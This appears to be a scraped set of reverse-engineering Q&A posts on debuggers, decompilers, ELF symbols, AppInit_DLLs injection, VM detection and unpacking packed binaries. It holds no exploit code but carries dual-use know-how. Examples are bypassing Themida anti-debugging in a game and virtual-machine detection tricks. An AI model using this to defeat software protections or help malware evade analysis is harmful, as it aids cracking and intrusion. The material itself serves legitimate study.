<p>Now that we have some background on how this works behind the scenes, OllyDbg actually has a helper for dealing with this sort of thing. You can simply open the View->Windows dialog item. Right click the window you want to catch button presses in, select message breakpoint on classproc, select command and notifications from the message dropdown or select the WM_COMMAND message. Now whenever you click the button you will break in the window procedure the application registered for that window. You still need to trace the code so that you can find the code that examines the message type and then handles the message. From now on it will be different depending on what type of framework is being used.</p>
","3289"
"Reverse engineering a Visual Basic p-code binary","17869","","<p>p-code is the intermediate code that was used in Visual Basic (before .NET). I would like to know where I can find resources/tools related to analysis of these virtual machine codes. </p>
","<p>Alex Ionescu, co-author of the latest ""Windows Internals"" book and contributor to ReactOS, wrote a good paper on the topic of VB decompilation quite a while ago. Here the <a href=""http://web.archive.org/web/20071020232030/http://www.alex-ionescu.com/vb.pdf"" rel=""nofollow"">direct link to the PDF</a> (originally from <code>http://www.alex-ionescu.com/vb.pdf</code>).</p>

<p>The paper documents the structures and constants of the file format itself and probably goes a long way in accompanying the information on <a href=""http://web.archive.org/web/20101127044116/http://vb-decompiler.com/pcode/opcodes.php?t=1"" rel=""nofollow"">the opcode list from the other answer</a>.</p>
","1602"
"Are there any OllyDbg anti-debug/anti-anti-debug plugins what work with Windows 7 / NT 6.x?","17420","","<p>Title says it all. I'm trying to RE a video game which is packed with Themida and the second I attach OllyDbg it crashes. When on XP, I can use StrongOD and PhantOm but neither of these work properly on Windows 7. I could use the XP machine via RDP but my Win 7 machine is much less irritating to use. </p>

<p>Does anybody have any suggestions? </p>
","<p>I'm not sure if it's still around, but Themida used to have a kernel-mode driver component that facilitated some of the protection features. It could well be installed on your system and catching the debugger out.</p>

<p>My first suggestion would be to try <a href=""http://debugger.immunityinc.com/"">Immunity Debugger</a>. It's an Olly fork that is designed for offensive debugging and exploit development, but it might have a different enough codebase and enough anti-anti-debug stuff built in to help.</p>

<p>Alternatively, you could use <a href=""http://cheatengine.org/index.php"">Cheat Engine</a> along with its DBVM kernel-mode module. It's usually used for cheating in games, but CE actually has a very fully featured debugger and some nice stealth features. The driver component re-implements a bunch of core Windows APIs, such as OpenProcess.</p>

<p>If the kernel-mode driver <em>isn't</em> still around, then it may well just be something like the OutputDebugString trick causing the crash. If the target is using TLS callbacks to execute code before WinMain, it might crash the debugger before you get to it. You could try editing Olly's options so that it breaks on the system entry point rather than WinMain.</p>
","3491"
"What is the linux equivalent to OllyDbg and Ida Pro?","16865","","<p>What is the Linux equivalent to <code>OllyDbg</code> and <code>IDA Pro</code> ? Or if there are multiple tools that do the various functions that <code>OllyDbg</code> and <code>IDA Pro</code> do, where can I find these tools? I'd like to start reversing some <em>elf</em> files on Linux and I'm just looking for a set of tools to get me started.</p>
","<p>Ida Pro runs on Windows, Linux and Mac OS, so i guess the Linux equivalent of Ida Pro is Ida Pro. The debugger that's used mostly seems to be gdb, possibly enhanced with a <a href=""https://reverseengineering.stackexchange.com/questions/1392/decent-gui-for-gdb"">GUI</a>.</p>

<p><a href=""http://www.hopperapp.com/"" rel=""noreferrer"">Hopper</a> and <a href=""http://radare.org/y/"" rel=""noreferrer"">Radare2</a> run on Linux as well.</p>
","6923"
"how can I diff two x86 binaries at assembly code level?","15675","","<p>I'm looking for a tool like <code>Beyond Compare</code>, <code>meld</code>, <code>kdiff</code>, etc. which can be used to compare two disassembled binaries. I know that there's binary (hex) comparison, which shows difference by hex values, but I'm looking for something that shows op-codes and arguments.</p>

<p>Anyone knows something that can help ?</p>
","<p>Unless I'm mistaken, it sounds like you are looking for a binary diffing tool. Some good options are below. <strong>These all require IDA Pro.</strong></p>

<ol>
<li><p><a href=""http://www.darungrim.org/"" rel=""nofollow noreferrer"">DarunGrim</a> (open-source)
<img src=""https://i.stack.imgur.com/CHycR.jpg"" alt=""DarunGrim""></p></li>
<li><p><a href=""http://www.zynamics.com/bindiff.html"" rel=""nofollow noreferrer"">BinDiff</a> (commercial)
<img src=""https://i.stack.imgur.com/MbI2c.gif"" alt=""BinDiff""></p></li>
<li><p><a href=""http://research.eeye.com/html/Tools/download/DiffingSuiteSetup.exe"" rel=""nofollow noreferrer"">eEye Binary Diffing Suite</a> (use archive.org to download the installer)</p></li>
</ol>
","1881"
"Determine Encryption Algorithm","15581","","<p>I'm analyzing some software that appears to encrypt its communications over the network, but it does not appear to be SSL.  How can I easily determine what encryption algorithm its using, and maybe find the key?</p>
","<p>Maybe check out <a href=""http://www.hexblog.com/?p=27"">this</a> IDA plugin.  </p>

<p>After you locate the crypto functions, doing a cross-reference in IDA should allow you to see where the functions are called and likely the key is nearby.  If you can set a break-point on those functions and see what is being passed in for the key, this, of course, would be the easiest way.</p>
","1424"
"What happens when a DLL is added to AppInit_DLL","15433","","<p>I have a malware sample that adds a DLL to the registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>.  There is malicious functionality in the DLL referenced by the registry key but this malware sample does not load or call the DLL, nor does it exhibit any other malicious behavior.</p>

<p>Why would malware add a DLL to this registry key?</p>
","<p>Basically, all DLLs listed in that reg-key are loaded when any process is started. 
For more info see <a href=""http://support.microsoft.com/kb/197571"" rel=""noreferrer"">Working with the AppInit_DLLs registry value</a>.</p>

<blockquote>
  <p>All the DLLs that are specified in this value are loaded by each Microsoft Windows-based application that is running in the current log on session.</p>
</blockquote>

<p>They are usually used by malicious code (tho it doesn't have to be malicious) as a way of DLL injection, to hook functions for example. To be more precise<strike>, AppInit DLLs are actually loaded only by the processes that link user32.dll.</strike>,as peter ferrie points out, AppInit DLLs are loaded by user32.dll after it has been loaded. 
The actual registry path differs between 64bit and 32bit version of OS.</p>

<p>So for for 32 bit DLL on 32 bit systems the path is:</p>

<pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs] 
</code></pre>

<p>For  64 bit DLL on 64 bit system :</p>

<pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs]
</code></pre>

<p>For for 32 bit DLL on 64 bit system:</p>

<pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs] 
</code></pre>

<p>Multiple entries are split with space or comma, and the path to the DLL must not contain any spaces for obvious reasons.
On Vista and later, the AppInit DLLs need to be signed, tho the registry value <code>RequireSignedAppInit_DLLs</code> can be set to 0 which disables this requirement.</p>
","1378"
"How to detect a virtualized environment?","14766","","<p>What are the different ways for a program to detect that it executes inside a virtualized environment ? And, would it be possible to detect what kind of virtualization is used ?</p>
","<p>the list could be endless, so I'll keep it short:</p>

<ul>
<li>virtualized environment artifacts: registry keys, hard disk name, network card address, specific drivers,...</li>
<li>environment differences: no mouse, internet connection, sound card,...</li>
<li>execution difference: detection of block translation (create another thread and apply statistics on IP), <a href=""https://code.google.com/p/corkami/source/browse/trunk/src/CoST/CoST.asm?r=1593#1363"" rel=""nofollow noreferrer"">different system registers values</a>, ...

<ul>
<li>lack of user interaction (specific for automated environment): no mouse movement, no file operations,...</li>
</ul></li>
<li>specific environment differences: <a href=""https://code.google.com/p/corkami/source/browse/trunk/src/CoST/CoST.asm?r=1593#2015"" rel=""nofollow noreferrer"">VmWare backdoor</a>, <a href=""https://code.google.com/p/corkami/source/browse/trunk/src/CoST/CoST.asm?r=1593#1900"" rel=""nofollow noreferrer"">VirtualPC exception bug</a>, ...</li>
</ul>

<p>(check the <a href=""https://reverseengineering.stackexchange.com/tags/anti-debug/info"">anti-debug tag wiki</a> for more)</p>
","1692"
"Open source GUI tool for decomposing a PDF","14730","","<p>I've been looking for an open-source GUI tool to extract PDF's in an automated way on Windows systems. I've used Didier Steven's tools with great interest for a while, but cannot make sense of how to use his <a href=""http://blog.didierstevens.com/programs/pdf-tools/"">PDF decomposing</a>/<a href=""http://blog.didierstevens.com/2008/10/20/analyzing-a-malicious-pdf-file/"">analyzing tools</a>, even after watching some of his videos. They seem to require significant understanding of the underlying PDF construction, and possibly much more.</p>

<p>For SWF files, the tool <a href=""http://h30499.www3.hp.com/t5/Following-the-Wh1t3-Rabbit/SWFScan-FREE-Flash-decompiler/ba-p/5440167"">SWFScan</a> is the kind I'm looking for: you load the file in question into the tool. From there, you can explore the links, scripts, and images. It even auto-analyses code and shows which parts may have security issues and what the issue is for each one, then gives a webpage reference with more information.</p>

<p>Does anyone know of a good open-source GUI for Windows that can load a PDF and not execute it but extract all the scripts, compiled code, text, links, images, etc.? Ideally, it would show the relation of each, like when you click on a certain image, it would tell you what script(s) are run, which URL it goes to, and let you see the image on its own.</p>

<p>PDF's are so common, next to SWF, that this kind of tool seems like it would already be common. I may have overlooked it/them.</p>
","<p>Sogeti's <a href=""http://esec-lab.sogeti.com/pages/origami.html"" rel=""nofollow noreferrer"">Origami framework</a> comes with a GTK based GUI.</p>

<blockquote>
  <p><strong>What is it?</strong></p>
  
  <p>origami is a Ruby framework designed to parse, analyze, and forge PDF
  documents. This is NOT a PDF rendering library. It aims at providing a
  scripting tool to generate and analyze malicious PDF files. As well,
  it can be used to create on-the-fly customized PDFs, or to inject
  (evil) code into already existing documents.</p>
  
  <p><strong>Features</strong></p>
  
  <ul>
  <li>Create PDF documents from scratch.  </li>
  <li>Parse existing documents,
  modify them and recompile them.  </li>
  <li>Explore documents at the object
  level, going deep into the document structure, uncompressing PDF
  object streams and desobfuscating names and strings.  </li>
  <li>High-level
  operations, such as encryption/decryption, signature, file
  attachments...  </li>
  <li>A GTK interface to quickly browse into the document
  contents.</li>
  </ul>
</blockquote>

<p><img src=""https://i.stack.imgur.com/hORLj.png"" alt=""enter image description here""></p>

<p><strong>Here is how I installed it on my Windows 7 system:</strong></p>

<ul>
<li>Ensure you have Ruby v1.9.3 installed for Windows
<a href=""http://rubyinstaller.org/downloads/"" rel=""nofollow noreferrer"">http://rubyinstaller.org/downloads/</a></li>
<li><em>NOTE:</em> This may work on newer/older Ruby versions, but I've only tested on v1.9.3 on Windows 7. (It does work with ruby v1.8.7 on my Linux system)</li>
<li><p>Next, install origami by opening an <em>ADMIN</em> cmd prompt and running:</p>

<p><code>gem install origami</code></p></li>
<li><p>Next, you will need to install <strong>ruby-gtk2</strong>. From the same ADMIN cmd prompt as earlier, run: </p>

<p><code>gem install gtk2</code></p></li>
</ul>

<p>Finally, simply run <code>pdfwalker</code> from a cmd prompt.</p>

<p>If this doesn't work for you, I'd suggest trying the above steps from <a href=""http://www.cygwin.com/"" rel=""nofollow noreferrer"">Cygwin</a>, where you can essentially follow instructions for installing on *nix.</p>

<p><strong>If you're installing it on Ubuntu/Debian</strong></p>

<p>Install ruby with the following command:</p>

<p><code>apt install ruby-full</code></p>

<p>Afterwards install origami as listed above:</p>

<p><code>gem install origami</code></p>

<p>If you want to use the GUI you will probably need to install libgtk2.0-dev and get the rake gem installed for you to be able to install gtk2:</p>

<pre><code>apt install libgtk2.0-dev
gem install rake
gem install gtk2
</code></pre>

<p>Since pdfwalker also needs libcanberra, it's a good idea to install it now:</p>

<p><code>apt install libcanberra-gtk-module</code></p>

<p>Afterwards install pdfwalker, since it was moved to a separate gem:</p>

<p><code>gem install pdfwalker</code></p>

<p>And it should run from the commandline as described above.</p>
","1549"
"What symbol tables stay after a strip In ELF format?","14399","","<p>I am currently looking at the ELF format, and especially at stripped ELF executable program files.</p>

<p>I know that, when stripped, the symbol table is removed, but some information are always needed to link against dynamic libraries. So, I guess that there are other symbols that are kept whatever the executable has been stripped or not. </p>

<p>For example, the dynamic symbol table seems to be always kept (actually this is part of my question). It contains all the names of functions coming from dynamic libraries that are used in the program.</p>

<p>Indeed, taking a stripped binary and looking at the output of <code>readelf</code> on it will give you the following output:</p>

<pre><code>Symbol table '.dynsym' contains 5 entries:
 Num:    Value          Size Type    Bind   Vis      Ndx Name
 0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
 1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
 2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
 3: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
 4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND perror@GLIBC_2.2.5 (2)
</code></pre>

<p>My question is, what are all the symbol tables that the system always need to keep inside the executable file, even after a strip (and what are they used for) ?</p>

<p>Another part of my question, would also be about how to use these dynamic symbols. Because, they are all pointing to zero and not to a valid address. You do we identify, as <code>objdump</code> does, their respective links to the code stored in the PLT. For example, in the following dump I got from <code>objdump -D</code>, we can see that the section <code>.plt</code> is split, I assume that this is thanks to symbols, into subsections corresponding to each dynamic function, I would like to know if this is coming from another symbol table that I do not know or if <code>objdump</code> rebuild this information (and, then, I would like to know how):</p>

<pre><code>Disassembly of section .plt:

0000000000400400 &lt;puts@plt-0x10&gt;:
400400:       ff 35 6a 05 20 00       pushq  0x20056a(%rip)
400406:       ff 25 6c 05 20 00       jmpq   *0x20056c(%rip)
40040c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000400410 &lt;puts@plt&gt;:
400410:       ff 25 6a 05 20 00       jmpq   *0x20056a(%rip)
400416:       68 00 00 00 00          pushq  $0x0
40041b:       e9 e0 ff ff ff          jmpq   400400 &lt;puts@plt-0x10&gt;

0000000000400420 &lt;__libc_start_main@plt&gt;:
400420:       ff 25 62 05 20 00       jmpq   *0x200562(%rip)
400426:       68 01 00 00 00          pushq  $0x1
40042b:       e9 d0 ff ff ff          jmpq   400400 &lt;puts@plt-0x10&gt;

0000000000400430 &lt;__gmon_start__@plt&gt;:
400430:       ff 25 5a 05 20 00       jmpq   *0x20055a(%rip)
400436:       68 02 00 00 00          pushq  $0x2
40043b:       e9 c0 ff ff ff          jmpq   400400 &lt;puts@plt-0x10&gt;

0000000000400440 &lt;perror@plt&gt;:
400440:       ff 25 52 05 20 00       jmpq   *0x200552(%rip)
400446:       68 03 00 00 00          pushq  $0x3
40044b:       e9 b0 ff ff ff          jmpq   400400 &lt;puts@plt-0x10&gt;
</code></pre>

<p><strong>Edit</strong>: Thanks to Igor's comment, I found the different offsets allowing to rebuild the information in <code>.rela.plt</code> (but, what is <code>.rela.dyn</code> used for ?).</p>

<pre><code>Relocation section '.rela.dyn' at offset 0x368 contains 1 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000600960  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0

Relocation section '.rela.plt' at offset 0x380 contains 4 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000600980  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts + 0
000000600988  000200000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main + 0
000000600990  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __gmon_start__ + 0
000000600998  000400000007 R_X86_64_JUMP_SLO 0000000000000000 perror + 0
</code></pre>
","<p>To answer to this question, we have first to rephrase it a bit. The real question can be stated like this: </p>

<blockquote>
  <p><em>What are the symbols that cannot be removed from an ELF binary file ?</em></p>
</blockquote>

<p>Indeed, <code>strip</code> removes quite a bit of information from the ELF file, but it could do a bit more (see the option <code>--strip-unneeded</code> from <code>strip</code> or the program <a href=""http://www.muppetlabs.com/~breadbox/software/elfkickers.html""><code>sstrip</code></a> for more about this). So, my original question was more about what symbols can be assumed to be in the executable file whatever modifications have been made on the ELF file.</p>

<p>In fact, there is only one type of symbols that you need to keep whatever happen, we call it <strong>dynamic symbols</strong> (as opposed at <em>static symbols</em>). They are a bit different from the static ones because we never know in advance where they will be pointing to in memory. Indeed, as they are supposed to point to external binary objects (libraries, plugin), the binary blob is dynamically loaded in memory while the process is running and we cannot predict at what address it will be located.</p>

<p>If the static symbols are stored in the <code>.symbtab</code> section, the dynamic ones have their own section called <code>.dynsym</code>. They are kept separate to ease the operation of <strong>relocation</strong> (the operation that will give a precise address to each dynamic symbol). The relocation operation also relies on two extra tables which are namely: </p>

<ul>
<li><code>.rela.dyn</code> : Relocation for dynamically linked objects (data or procedures), if PLT is not used.</li>
<li><code>.rela.plt</code> : List of elements in the PLT (Procedure Linkage Table), which are liable to the relocation during the dynamic linking (if PLT is used).</li>
</ul>

<p>Somehow, put all together, <code>.dynsym</code>, <code>.rela.dyn</code> and <code>.rela.plt</code> will allow to patch the initial memory (<em>i.e.</em> as mapped in the ELF binary), in order for the dynamic symbols to point to the right object (data or procedure).</p>

<p>Just to illustrate a bit more the process of relocation of dynamic symbols, I built examples in i386 and amd64 architectures.</p>

<h2>i386</h2>

<pre><code>Symbol table '.dynsym' contains 6 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND perror@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
     5: 080484fc     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used


Relocation section '.rel.dyn' at offset 0x28c contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049714  00000306 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x294 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049724  00000107 R_386_JUMP_SLOT   00000000   perror
08049728  00000207 R_386_JUMP_SLOT   00000000   puts
0804972c  00000307 R_386_JUMP_SLOT   00000000   __gmon_start__
08049730  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main
</code></pre>

<h2>amd64</h2>

<pre><code>Symbol table '.dynsym' contains 5 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND perror@GLIBC_2.2.5 (2)



Relocation section '.rela.dyn' at offset 0x368 contains 1 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000600960  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0

Relocation section '.rela.plt' at offset 0x380 contains 4 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000600980  000100000007 R_X86_64_JUMP_SLOT 0000000000000000 puts + 0
000000600988  000200000007 R_X86_64_JUMP_SLOT 0000000000000000 __libc_start_main + 0
000000600990  000300000007 R_X86_64_JUMP_SLOT 0000000000000000 __gmon_start__ + 0
000000600998  000400000007 R_X86_64_JUMP_SLOT 0000000000000000 perror + 0
</code></pre>

<p>A few interesting web pages and articles about dynamic linking:</p>

<ul>
<li><a href=""http://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html"">PLT and GOT - the key to code sharing and dynamic libraries</a>;</li>
<li><a href=""http://www.technovelty.org/linux/stripping-shared-libraries.html"">Stripping shared libraries</a>;</li>
<li><a href=""http://www.codeproject.com/Articles/70302/Redirecting-functions-in-shared-ELF-libraries"">Redirecting functions in shared ELF libraries</a>;</li>
<li><a href=""http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/"">The Art Of ELF: Analysis and Exploitations</a>;</li>
<li><a href=""http://bottomupcs.sourceforge.net/csbu/x3824.htm"">Global Offset Tables</a>;</li>
</ul>
","2639"
"How to decompile an Objective-C static library (for iOS)?","14212","","<p>I'm trying to use IDA Pro v6.5 <s>(freeware)</s> (demo) to decompile an objective-c library compiled for ARM7-7S. I tried Hopper v2.8.8 (freeware) with no success. <br><br>
I had no problem until I tried to display a pseudocode. In fact, I can't find the option for that as you can see on this screenshot : <img src=""https://i.stack.imgur.com/0x93j.png"" alt=""enter image description here""><br>
I believe to know that I can do it because IDA should support ARM decompilation... So my question is : How to decompile an objective-c library ? Or, Am I missing something ?</p>
","<p>There is <a href=""http://derevenets.com/"">SmartDec</a>, a native-code to C/C++ decompiler. It has two versions. Standalone and plugin to IDA. The latter supports all IDA's architectures, provides full GUI integration - is easy to work with -, makes use of <a href=""https://reverseengineering.stackexchange.com/questions/175/what-is-a-flirt-signature"">IDA Flirt signatures</a> and will make use of runtime information if you use it together with <a href=""https://github.com/deresz/funcap"">funcap</a>. There is also <a href=""http://decompiler.fit.vutbr.cz/decompilation/"">Retargetable Decompiler</a>, an online decompiler developed at Brno University of Technology that supports x86, ARM, ARM+Thumb and MIPS and can decompile to C or Python. It provides not only the decompilation but packer and compiler information, extraction of debug information, call and flow graphs, and signature-based removal of statically linked library code. Its only problem is its input size limitation of 10MB.</p>

<p>If those do not suffice your needs, you could also adapt or wait for the implementation of ARM support in either <a href=""https://github.com/EiNSTeiN-/ida-decompiler"">Einstein's IDA Decompiler</a>, <a href=""https://github.com/jcdutton/libbeauty"">libbeauty</a> - <a href=""https://github.com/jcdutton/reference"">reference material</a> -, or <a href=""http://sourceforge.net/projects/desquirr/"">desquirr</a> - as someone already <a href=""http://www.embedded.com/design/real-time-and-performance/4023282/3/Decompiling-the-ARM-architecture-code"">did</a> but released no code. The first two are the most promising. You could also wait for <a href=""http://hopperapp.com/"">Hopper</a> to improve it's ARM support. 
However, if you need to decompile it now, you'll have to purchase <a href=""https://www.hex-rays.com/products/ida/"">IDA</a> and the <a href=""https://www.hex-rays.com/products/decompiler/"">Hex-Rays Decompiler</a>, which is more than worth its cost - if you can afford it - and goes for about 3314 USD - including courier shipping - as of now for a named license. More informations about the purchase can be found in the link Mr.Skochinsky <a href=""https://www.hex-rays.com/products/ida/order.shtml"">provided</a>.</p>
","3656"
"How do I figure out what is burned on an Arduino ROM?","14107","","<p>I have an Arduino Uno Rev3. I would like to extract and find out what code is burned on the ROM of the micro-controller board. </p>

<ol>
<li>How do I extract the code from the board?</li>
<li>How do I figure out the original source code that went into the hex file? </li>
</ol>
","<p>I'll answer this in two parts, #1 is relatively easy, #2 impossible to the level which I'm assuming you want.</p>

<h2>1. Extracting the hex code from the Uno:</h2>

<p>While the specifics will depend on the revision of the Uno that you have, you'll want to use avrdude (<a href=""http://savannah.nongnu.org/projects/avrdude"">available for linux, bundled with the OS X Arduino software</a>) and a command similar to the following that would extract the information from an ATmega168:</p>

<pre><code>avrdude -F -v -pm168 -cstk500v1 -P/dev/ttyUSB0 -b19200 -D -Uflash:r:program.bin:r
</code></pre>

<p>Look at the <a href=""http://www.nongnu.org/avrdude/user-manual/avrdude_4.html#Option-Descriptions"">avrdude documentation</a> to match the part parameter <code>-p</code> specific to your device (or post them and we can go from there).</p>

<p>Since it appears that you have the <a href=""http://arduino.cc/en/Main/arduinoBoardUno"">Uno Rev3</a>, that board has an ATmega328 (<code>-pm328</code>).  The programmer ""communicates using the original STK500 protocol"" thus the communication protocol flag <code>-c</code> should be <code>-cstk500v1</code> the command you would need (assuming the Uno is connected to /dev/ttyUSB0) follows:</p>

<pre><code>avrdude -F -v -pm328p -cstk500v1 -P/dev/ttyUSB0 -b19200 -D -Uflash:r:program.bin:r
</code></pre>

<p>Next up your second question.</p>

<h2>2. Converting Hex code to original source:</h2>

<p>Sorry, but that's not possible. While you can get some hex to c ""decompilers"" the gibberish returned, while functionally correct, will not be human readable (some commercial ones, like Hex-Rays, might give you some level of human-readability). </p>

<p>With that said, you're best bet would be a hex to assembly translator/converter - which will still only give you a better picture of what's happening, but will still be (by definition) very low level. All variable names, comments etc would be stripped and you're still going to be left with not knowing the original source program contents - just the compiled result. </p>

<p>Since you're dealing with an Atmel device you <em>could</em> try to use the avr specific gcc toolchain <code>avr-gcc</code>. Specifically, you'll need <code>avr-objdump</code> using the needed MCU type flag <code>-m atmega328</code> (avr5) architecture (<a href=""http://www.nongnu.org/avr-libc/user-manual/using_tools.html"">Full List of Available Architectures, MCU types</a>)</p>

<pre><code>avr-objdump -s -m atmega328 program.hex &gt; program.dump
</code></pre>

<p>It is also possible, depending on your configuration, that providing the architecture type itself (avr5) would be sufficient:</p>

<pre><code>avr-objdump -s -m avr5 program.hex &gt; program.dump
</code></pre>
","127"
"What is the meaning of movabs in gas/x86 AT&T syntax?","13911","","<p>I just found a strange instruction by assembling (with <code>gas</code>) and disassembling (with <code>objdump</code>) on a <code>amd64</code> architecture.</p>

<p>The original <code>amd64</code> assembly code is:</p>

<pre><code>mov 0x89abcdef, %al
</code></pre>

<p>And, after <code>gas</code> compiled it (I am using the following command line: <code>gcc -m64 -march=i686 -c -o myobjectfile myassemblycode.s</code>), <code>objdump</code> gives the following code:</p>

<pre><code>a0 df ce ab 89 00 00    movabs 0x89abcdef, %al
</code></pre>

<p>My problem is that I cannot find any <code>movabs</code>, nor <code>movab</code> in the Intel assembly manual (not even a <code>mova</code> instruction).</p>

<p>So, I am dreaming ? What is the meaning of this instruction ? My guess is that it is a quirks from the GNU binutils, but I am not sure of it.</p>

<p>PS: I checked precisely the spelling of this instruction, so it is NOT a <code>movaps</code> instruction for sure.</p>
","<p>Here's the <a href=""http://sourceware.org/binutils/docs/as/i386_002dVariations.html"">official documentation for <code>gas</code></a>, quoting the relevant section:</p>

<blockquote>
  <p>In AT&amp;T syntax the size of memory operands is determined from the last
  character of the instruction mnemonic. Mnemonic suffixes of <code>b</code>, <code>w</code>,
  <code>l</code> and <code>q</code> specify byte (8-bit), word (16-bit), long (32-bit) and
  quadruple word (64-bit) memory references. Intel syntax accomplishes
  this by prefixing memory operands (not the instruction mnemonics) with
  <code>byte ptr</code>, <code>word ptr</code>, <code>dword ptr</code> and <code>qword ptr</code>. Thus, Intel <code>mov
  al, byte ptr foo</code> is <code>movb foo, %al</code> in AT&amp;T syntax. </p>
  
  <p>In 64-bit code, <code>movabs</code> can be used to encode the <code>mov</code> instruction
  with the 64-bit displacement or immediate operand.</p>
</blockquote>

<p>Particularly read the last sentence.</p>

<p><strong>Note:</strong> Found via Google operator <code>inurl</code>, searching for <code>movabs inurl:sourceware.org/binutils/</code>.</p>
","2628"
"Find out a Java class file's compiler version","13789","","<p>I have a java class file. How do I find out the version of the compiler used to compile this file? I'm on Ubuntu Server 12.04.</p>
","<p>The JDK includes a <code>javap</code> command. It gives a lot information, but you can use it like this:</p>

<pre><code>javap -verbose yourClass | grep version
</code></pre>

<p>Example output:</p>

<pre><code>  minor version: 0
  major version: 51
</code></pre>

<p>The major version tells you which version the compiler had:</p>

<pre><code>J2SE 8 = 52,
J2SE 7 = 51,
J2SE 6.0 = 50,
J2SE 5.0 = 49,
JDK 1.4 = 48,
JDK 1.3 = 47,
JDK 1.2 = 46,
JDK 1.1 = 45
</code></pre>
","1329"
"Difference between 'add' and 'adds' in ARM assembler?","13765","","<p>I am starting to look a bit more precisely at ARM assembler and I looked up some dumps from <code>objdump</code>. I saw a lot of instruction (<code>add</code> is not the only one) with an extra <code>s</code> at the end (<code>adds</code>, <code>subs</code>, ...).</p>

<p>I looked a bit to the ARM documentation and it seems to mean something significant, but I can't figure out exactly what (the documentation I found about it seemed extremely obscure to me).</p>

<p>Has somebody some insight on what is the meaning of this extra <code>s</code> added at the end of some ARM instructions ?</p>
","<p>Usual <code>ADD</code> doesn't update flags.
<code>ADDS</code> does.
See better documentation at <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0489i/Cihcjfjg.html"" rel=""nofollow"">arm infocenter</a>.
As it wrote there:</p>

<blockquote>
  <p>If S is specified, these instructions update the N, Z, C and V flags according to the result.</p>
</blockquote>
","4262"
"Unpacking binaries in a generic way","13573","","<p>I find that more and more often binaries are being packed with exe protectors such as upx, aspack etc. I tried to follow a few tutorials on how to unpack them but the examples are often quite easy while my targets are not.</p>

<p>I am looking for good resources and any hints/tips on how to unpack targets.</p>
","<p>Unpacking a generic wrapping packer or cryptor usually involves the following steps:</p>

<h2>1. Trace the code, possibly evading or bypassing anti-debugging checks.</h2>

<p>This is not difficult with simple packers but might be tricky with the more advanced ones. They may employ timing checks (<code>rdtsc</code>), exception-based control transfer, using debug registers for calculations etc. Using a VM or an emulator here usually helps against most of them.</p>

<h2>2. Find the <em>original entry point</em> (OEP)</h2>

<p>There are many ways to do this. Sometimes the jump to OEP is obvious when it follows a chunk of looping code and there's nothing reasonable-looking after it. Or you may recognize the code at OEP if you're familiar with the entrypoints produced by different compilers. A couple other tricks:</p>

<ol>
<li><p>if the packer saves the original registers before unpacking, set a hardware breakpoint on their location in the stack - this way you'll break right when they're restored before jumping to OEP.</p></li>
<li><p>if during tracing you can identify memory where the unpacked code is being written, set a page execution breakpoint on that memory range - it will trigger after the jump. IDA allows you to set such a breakpoint, and I think OllyDbg too.</p></li>
<li><p>set breakpoints on common APIs used by startup code, e.g. <code>GetCommandLine</code> or <code>GetVersionEx</code>. This won't get you the exact OEP, but you can usually go back the callstack and find it more or less easily.</p></li>
</ol>

<h2>3. Dump the unpacked code</h2>

<p>If you're using IDA, you don't actually need to <em>dump</em> the file into a separate file - it's enough to take a memory snapshot that would copy the bytes from memory to the database so you can analyze them later. One thing to keep in mind here is that if the packer used dynamically allocated memory, you need to mark it as ""loader"" so it gets included in the snapshot. More <a href=""http://www.hexblog.com/?p=8"">here</a>.</p>

<h2>4. Restore imports</h2>

<p>I'm not very familiar how it's done in Olly or other debugger, but AFAIK you need to use a tool like ImpREC on your dump and a copy of the process in memory.</p>

